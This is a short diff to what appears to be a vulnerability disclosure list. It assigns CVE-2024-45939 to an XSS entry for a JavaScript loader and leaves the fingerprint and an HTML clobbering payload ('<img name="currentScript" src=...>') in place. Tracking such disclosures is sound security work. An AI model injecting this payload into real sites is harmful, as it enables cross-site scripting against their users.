@@ -8,7 +8,7 @@
 + Fingerprint: `typeof window.steal !== 'undefined' && typeof window.steal.loader === 'object'`
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>```
 + Impact: XSS
-+ CVE: CVE-2024-XXXXX
++ CVE: CVE-2024-45939
 + Status: Accepted
 + Foundby: TheHulk
 
